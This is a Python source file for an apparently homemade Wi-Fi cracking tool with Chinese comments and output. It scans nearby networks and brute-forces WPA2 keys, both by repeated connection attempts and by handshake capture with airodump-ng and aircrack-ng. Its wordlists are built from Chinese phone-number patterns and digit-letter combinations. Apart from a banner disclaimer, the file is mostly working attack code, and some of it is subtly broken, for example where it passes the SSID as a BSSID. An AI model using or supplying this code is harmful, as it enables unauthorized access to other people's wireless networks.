import pywifi
import time
import sys
import subprocess
import ctypes
import traceback
import os
from pywifi import const
from datetime import datetime
from PyQt5.QtWidgets import QApplication, QMessageBox
import itertools
from tqdm import tqdm

def is_network_adapter_enabled():
    # 使用netsh命令检查网络适配器状态
    result = subprocess.run(["netsh", "interface", "show", "interface"], capture_output=True, text=True)
    output = result.stdout
    # 检查输出中是否包含"已启用"字样
    return "已启用" in output

def enable_network_adapter():
    # 使用netsh命令启用网络适配器
    subprocess.run(["netsh", "interface", "set", "interface", "name='Wi-Fi'", "admin=enable"])

def is_wifi_enabled():
    # 检查Wi-Fi是否已启用
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    return iface.status() != const.IFACE_DISCONNECTED

def enable_wifi():
    # 尝试启用Wi-Fi
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    if iface.status() == const.IFACE_DISCONNECTED:
        iface.disconnect()
        time.sleep(1)
        iface.connect()
        time.sleep(1)
        return iface.status() == const.IFACE_CONNECTED
    return False

def is_connected_to_wifi(ssid):
    # 使用系统命令获取当前连接的 WiFi 名称
    result = subprocess.run('netsh wlan show interfaces', shell=True, capture_output=True, text=True)
    output = result.stdout
    for line in output.split('\n'):
        if 'SSID' in line:
            current_ssid = line.split(':')[-1].strip()
            return current_ssid == ssid
    return False

def connect_to_wifi(ssid, password):
    try:
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
        iface.disconnect()
        time.sleep(1)  # 确保断开连接
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.key = password
        profile.auth = pywifi.const.AUTH_ALG_OPEN
        profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
        profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
        iface.add_network_profile(profile)
        iface.connect(profile)
        time.sleep(5)  # 等待连接
        if iface.status() == pywifi.const.IFACE_CONNECTED:
            print("连接成功")
            return True
        else:
            print("连接失败")
            return False
    except Exception as e:
        print(f"连接过程中出现错误: {e}")
        return False

def connect_to_wifi_baoli(ssid, password):
    try:
        result = subprocess.run(
            ['nmcli', 'dev', 'wifi', 'connect', ssid, 'password', password],
            capture_output=True,
            text=True
        )
        if "successfully activated" in result.stdout:
            print(f"成功连接到WiFi：{ssid}，密码是：{password}")
            return True
        else:
            print(f"尝试密码 {password} 失败。")
            return False
    except Exception as e:
        print(f"连接时出错：{e}")
        return False


def wifi_scan():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(2)
    bss = iface.scan_results()
    # 按信号强度从高到低排序
    sorted_bss = sorted(bss, key=lambda w: w.signal, reverse=True)
    
    # 使用 tqdm 显示进度条
    for _ in tqdm(
        range(100), 
        desc="扫描进度", 
        ascii=False, 
        ncols=75, 
        bar_format="{l_bar}{bar} [时间: {elapsed} | 进度: {percentage:.0f}%]"
    ):
        time.sleep(0.04) 

    # 添加更多信息到返回结果中
    return [(w.signal, w.ssid.encode('raw_unicode_escape').decode('utf-8'), w.bssid, w.auth, w.akm, w.cipher) for w in sorted_bss]


def try_connect_without_password(ssid):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = pywifi.const.AUTH_ALG_OPEN
    profile.akm.append(pywifi.const.AKM_TYPE_NONE)  # 无密码连接
    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile)
    time.sleep(5)
    if iface.status() == pywifi.const.IFACE_CONNECTED:
        return True
    else:
        iface.disconnect()
        return False

def get_wifi_name():
    # 执行命令
    result = subprocess.run('netsh wlan show interfaces', shell=True, capture_output=True, text=True)
    # 解析输出结果
    output = result.stdout
    for line in output.split('\n'):
        if 'SSID' in line:
            return line.split(':')[-1].strip()
    return None

def run_as_admin():
    # 检查是否已经是管理员
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True
    else:
        # 重新启动脚本并请求管理员权限
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        return False

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    
    
def generate_phone_numbers():
    for prefix in range(130, 200):
        for suffix in range(10000000, 100000000):
            yield f"{prefix}{suffix}"

def generate_passwords():
    # 0. 电话号码
    for phone in generate_phone_numbers():
        yield phone

    # 0.5. 一个大写或小写字母 + 电话号码
    for phone in generate_phone_numbers():
        for letter in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ":
            yield f"{letter}{phone}"

    # 0.8. @ + 电话号码
    for phone in generate_phone_numbers():
        yield f"@{phone}"

    # 0.9. @ + 一个大写或小写字母 + 电话号码
    for phone in generate_phone_numbers():
        for letter in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ":
            yield f"@{letter}{phone}"

    # 1. 数字（不包含电话号码）
    for length in range(8, 17):
        for digits in itertools.product("0123456789", repeat=length):
            yield ''.join(digits)

    # 2. 数字 + 一到六个小写字母
    for length in range(1, 7):
        for digits in itertools.product("0123456789", repeat=8):
            for letters in itertools.product("abcdefghijklmnopqrstuvwxyz", repeat=length):
                yield ''.join(digits) + ''.join(letters)

    # 3-7. 数字 + 小写字母 + 大写字母
    for num_letters in range(1, 6):
        for digits in itertools.product("0123456789", repeat=8):
            for lower_letters in itertools.product("abcdefghijklmnopqrstuvwxyz", repeat=num_letters):
                for upper_letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
                    yield ''.join(digits) + ''.join(lower_letters) + upper_letter

    # 8. 数字 + 一到六个大写字母
    for length in range(1, 7):
        for digits in itertools.product("0123456789", repeat=8):
            for letters in itertools.product("ABCDEFGHIJKLMNOPQRSTUVWXYZ", repeat=length):
                yield ''.join(digits) + ''.join(letters)

    # 9. @ + （所有组合）
    for pwd in generate_passwords():
        yield f"@{pwd}"

def generate_password_files():
    # 获取脚本所在目录
    script_dir = os.path.dirname(os.path.abspath(__file__))

    # 使用 generate_passwords 函数生成密码
    password_generator = generate_passwords()

    try:
        # 生成第一个密码字典文件
        file1_path = os.path.join(script_dir, 'passwords1.txt')
        with open(file1_path, 'w') as file1:
            for _ in range(1000):
                try:
                    password = next(password_generator)
                    file1.write(password + '\n')
                except StopIteration:
                    print("密码生成器已耗尽")
                    break

        # 生成第二个密码字典文件
        file2_path = os.path.join(script_dir, 'passwords2.txt')
        with open(file2_path, 'w') as file2:
            for _ in range(1000):
                try:
                    password = next(password_generator)
                    file2.write(password + '\n')
                except StopIteration:
                    print("密码生成器已耗尽")
                    break

        print("密码字典文件已生成：", file1_path, file2_path)

    except Exception as e:
        print(f"生成密码文件时出错: {e}")


        

def brute_force_wifi(ssid):
    import pywifi
    from pywifi import const

    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]

    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    password_list = []

    # 打开两个密码文件
    with open('passwords1.txt', 'r') as file1, open('passwords2.txt', 'r') as file2:
        password_generator1 = (pwd.strip() for pwd in file1)
        password_generator2 = (pwd.strip() for pwd in file2)

        while True:
            # 从第一个文件生成1000个密码
            while len(password_list) < 1000:
                try:
                    password_list.append(next(password_generator1))
                except StopIteration:
                    break

            # 使用当前的密码列表进行尝试连接
            for pwd in password_list:
                profile.key = pwd
                tmp_profile = interface.add_network_profile(profile)

                interface.connect(tmp_profile)
                start_time = time.time()
                timeout = 5
                while time.time() - start_time < timeout:
                    if interface.status() == const.IFACE_CONNECTED:
                        print(f'\r连接成功！密码为：{pwd}')
                        return True
                    time.sleep(0.5)
                # 如果连接失败，确保输出失败信息
                print(f'\r[ * ]利用密码 {pwd} 尝试破解失败。', end='')

            # 清空已使用的密码列表
            password_list.clear()

            # 从第二个文件生成1000个密码
            while len(password_list) < 1000:
                try:
                    password_list.append(next(password_generator2))
                except StopIteration:
                    break

            # 使用当前的密码列表进行尝试连接
            for pwd in password_list:
                profile.key = pwd
                tmp_profile = interface.add_network_profile(profile)

                interface.connect(tmp_profile)
                start_time = time.time()
                timeout = 5
                while time.time() - start_time < timeout:
                    if interface.status() == const.IFACE_CONNECTED:
                        print(f'\r连接成功！密码为：{pwd}')
                        return True
                    time.sleep(0.5)
                # 如果连接失败，确保输出失败信息
                print(f'\r[ * ]利用密码 {pwd} 尝试破解失败。', end='')

            # 清空已使用的密码列表
            password_list.clear()

    return False

import subprocess

def check_monitor_mode(iface):
    try:
        # 确保 iface 是一个字符串
        iface_name = str(iface)
        # 使用 iwconfig 检查接口信息
        result = subprocess.run(['iwconfig', iface_name], capture_output=True, text=True)
        # 检查输出中是否包含 "Mode:Monitor"
        if "Mode:Monitor" in result.stdout:
            return True
    except Exception as e:
        print(f"检查监视模式时出错: {e}")
    return False


def check_monitor_mode_support():
    wifi = pywifi.PyWiFi()
    interfaces = wifi.interfaces()
    if not interfaces:
        print("未检测到任何无线网卡。")
        return False
    for iface in interfaces:
        # 检查网卡是否支持监视模式
        if iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_CONNECTED]:   
            if check_monitor_mode(iface):
                return True
    print("未检测到支持监视模式的无线网卡。")
    return False

def try_connect(ssid):
    original_ssid = get_wifi_name()  # 获取当前连接的 WiFi 名称

    while True:
        if not is_network_adapter_enabled():
            enable_network_adapter()
            print("网络适配器已启用")
            time.sleep(5)

        current_ssid = get_wifi_name()
        if current_ssid == ssid:
            print(f"您已经连接到了 {ssid}")
            return True

        print(f"尝试直接连接到 {ssid}...")

        if try_connect_without_password(ssid):
            current_ssid = get_wifi_name()
            if current_ssid == ssid:
                print(f"成功直接连接到 {ssid}")
                return True

        print("直接连接失败，尝试恢复到原来的网络...")
        if original_ssid and connect_to_wifi(original_ssid, "your_original_password"):
            print(f"已恢复到原来的网络：{original_ssid}")
        else:
            print("无法恢复到原来的网络，请检查网络设置。")

        while True:
            print("")
            print("")
            print(f"请问您要对{ssid}进行什么操作？")
            choice = input("请选择：1. 输入密码连接  2. 暴力破解  3. 退出 (输入1，2，3)：")
            if choice == '1':
                while True:
                    password = input("请输入WiFi密码：")
                    if len(password) < 8 or not all(c.isalnum() or c in "!@#$%^&*()" for c in password):
                        print("密码长度至少为8位，并且只能包含字母、数字和常见特殊字符。")
                        continue
                    if connect_to_wifi(ssid, password):
                        print(f"成功连接到 {ssid}")
                        input("按任意键退出...")
                        return True
                    else:
                        print("连接失败，密码可能错误。请检查密码是否正确，或尝试其他选项。")
                        retry_choice = input("请选择：1. 重新输入密码  2. 返回 (输入1或2)：")
                        if retry_choice == '1':
                            continue
                        elif retry_choice == '2':
                            break

            elif choice == '2':
                if not check_monitor_mode_support():
                    print("没有检测到支持监视模式的无线网卡，无法进行暴力破解。")
                    input("按任意键返回...")
                    continue

                bssid = get_bssid_for_ssid(ssid)
                handshake_file = 'handshake.cap'
                wordlist_files = ['passwords1.txt', 'passwords2.txt']  # 两个密码字典文件

                # 循环使用两个密码字典文件
                for wordlist_file in itertools.cycle(wordlist_files):
                    brute_force_wifi_with_aircrack(ssid, handshake_file='handshake.cap')
                    if brute_force_wifi(ssid):
                        break
            elif choice == '3':
                return False
            else:
                print("无效的选择，请重新输入")
                input("按任意键退出...")

def capture_handshake(ssid, interface_name='wlan0', handshake_file='handshake.cap'):
    import subprocess

    # 使用 airodump-ng 捕获握手包
    try:
        print(f"正在捕获 {ssid} 的握手包...")
        command = [
            "airodump-ng",
            "--bssid", ssid,
            "--write", handshake_file,
            interface_name
        ]
        subprocess.run(command, timeout=60)  # 设置超时时间为60秒
        print("握手包捕获完成。")
    except subprocess.TimeoutExpired:
        print("捕获握手包超时。")
        return False
    except Exception as e:
        print(f"捕获握手包时出错: {e}")
        return False

    # 检查握手包文件是否存在
    if os.path.exists(handshake_file):
        print(f"握手包文件 {handshake_file} 已生成。")
        return True
    else:
        print(f"未能捕获到握手包。")
        return False

def brute_force_wifi_with_aircrack(ssid, handshake_file='handshake.cap'):
    import subprocess
    import os

    # 捕获握手包
    if not capture_handshake(ssid):
        print("无法获取握手包，回退操作。")
        return False

    # 密码字典文件列表
    wordlist_files = ['passwords1.txt', 'passwords2.txt']

    # 循环使用密码字典文件
    for wordlist_file in itertools.cycle(wordlist_files):
        if not os.path.exists(wordlist_file):
            print(f"密码字典文件 {wordlist_file} 不存在。请先生成密码字典。")
            continue

        # 使用 aircrack-ng 进行破解
        command = [
            "aircrack-ng",
            "-b", ssid,  # 使用 SSID 作为 BSSID
            "-w", wordlist_file,
            handshake_file
        ]

        try:
            result = subprocess.run(command, capture_output=True, text=True)
            print(result.stdout)
            if "KEY FOUND" in result.stdout:
                print(f"成功破解！密码已找到。")
                return True
        except Exception as e:
            print(f"使用 aircrack-ng 破解时出错: {e}")

    return False

def get_bssid_for_ssid(ssid):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(2)
    bss = iface.scan_results()
    
    for w in bss:
        if w.ssid == ssid:
            return w.bssid
    return None

def main():
    try:
        # 生成密码文件
        generate_password_files()

        print("""\033[1;32m
WWWWWWWW                           WWWWWWWW                        KKKKKKKKK    KKKKKKK                    
W::::::W                           W::::::W                        K:::::::K    K:::::K                    
W::::::W                           W::::::W                        K:::::::K    K:::::K                    
W::::::W                           W::::::W                        K:::::::K   K::::::K                    
 W:::::W           WWWWW           W:::::W   uuuuuu    uuuuuu      KK::::::K  K:::::KKK       eeeeeeeeeeee    
  W:::::W         W:::::W         W:::::W    u::::u    u::::u        K:::::K K:::::K        ee::::::::::::ee  
   W:::::W       W:::::::W       W:::::W     u::::u    u::::u        K::::::K:::::K        e::::::eeeee:::::ee
    W:::::W     W:::::::::W     W:::::W      u::::u    u::::u        K:::::::::::K        e::::::e     e:::::e
     W:::::W   W:::::W:::::W   W:::::W       u::::u    u::::u        K:::::::::::K        e:::::::eeeee::::::e
      W:::::W W:::::W W:::::W W:::::W        u::::u    u::::u        K::::::K:::::K       e:::::::::::::::::e 
       W:::::W:::::W   W:::::W:::::W         u::::u    u::::u        K:::::K K:::::K      e::::::eeeeeeeeeee  
        W:::::::::W     W:::::::::W          u:::::uuuu:::::u      KK::::::K  K:::::KKK   e:::::::e           
         W:::::::W       W:::::::W           u:::::::::::::::uu    K:::::::K   K::::::K   e::::::::e          
          W:::::W         W:::::W             u:::::::::::::::u    K:::::::K    K:::::K    e::::::::eeeeeeee  
           W:::W           W:::W               uu::::::::uu:::u    K:::::::K    K:::::K     ee:::::::::::::e  
            WWW             WWW                 uuuuuuuu  uuuu     KKKKKKKKK    KKKKKKK       eeeeeeeeeeeeee  

  """ + "\033[0m")    
        print("\033[1;32m作者：无氪（wuke）\033[0m")
        print("\033[1;32m版权所有：无氪（wuke）\033[0m")
        print("\033[1;32m联系方式：wuke15279888684@gmail.com\033[0m")
        print("\033[1;32m交流群：https://qm.qq.com/q/EOX8tl7paU\033[0m")
        print("\033[1;32m版本：1.0\033[0m")
        print("\033[1;32m项目仓库：https://github.com/HonkerWuKe/WiFi__GURU\033[0m")
        print("\033[1;32m免责声明：本工具仅供学习交流，请勿用于非法用途，否则后果自负\033[0m")
        print("\033[1;32m\033[0m")  
        input("\033[1;32m按任意键启动工具...\033[0m")

        # 清屏操作
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')

        print("正在扫描 WiFi 网络...") 
        print("")
        print("")
        wifi_scan_result = wifi_scan()

        if not wifi_scan_result:
            print("未找到任何 WiFi 网络。请确保您的 WiFi 适配器工作正常。")
            input("按任意键退出...")
            return

        while True:
            # 清屏操作
            if os.name == 'nt':
                os.system('cls')
            else:
                os.system('clear')

            print("WiFi列表：")
            print("-----------------------------------------------------------------------------------------------------")
            for i, wifi_info in enumerate(wifi_scan_result):
                print(f"{i:2}       信号强度：{wifi_info[0]:2} dBm      WiFi名称：{wifi_info[1]:<27} BSSID：{wifi_info[2]}")
            print("-----------------------------------------------------------------------------------------------------")
            user_input = input("\n请输入您想要连接的 WiFi 序号：")
            try:
                selected_wifi_index = int(user_input)
                if selected_wifi_index < 0 or selected_wifi_index >= len(wifi_scan_result):
                    print("无效的序号，请重新输入有效的序号。")
                    input("按任意键继续...")
                    continue
            except ValueError:
                print("无效的输入，请输入一个有效的序号。")
                input("按任意键继续...")
                continue

            selected_wifi_info = wifi_scan_result[selected_wifi_index]
            if len(selected_wifi_info) < 3:
                print("WiFi信息不完整，无法继续。")
                input("按任意键继续...")
                continue

            ssid = selected_wifi_info[1]
            bssid = selected_wifi_info[2]

            # 检查是否已经连接到所选的WiFi
            if is_connected_to_wifi(ssid):
                print(f"您已经连接到了 {ssid}")
                input("按任意键返回...")
                continue

            if try_connect(ssid):
                break

            input("按任意键退出...")
    except Exception as e:
        print(f"程序出现错误: {e}")
        sys.exit(1)

if __name__ == "__main__":
    if not is_admin():
        print("正在请求管理员权限...")
        run_as_admin()
        sys.exit()  
    else:
        main()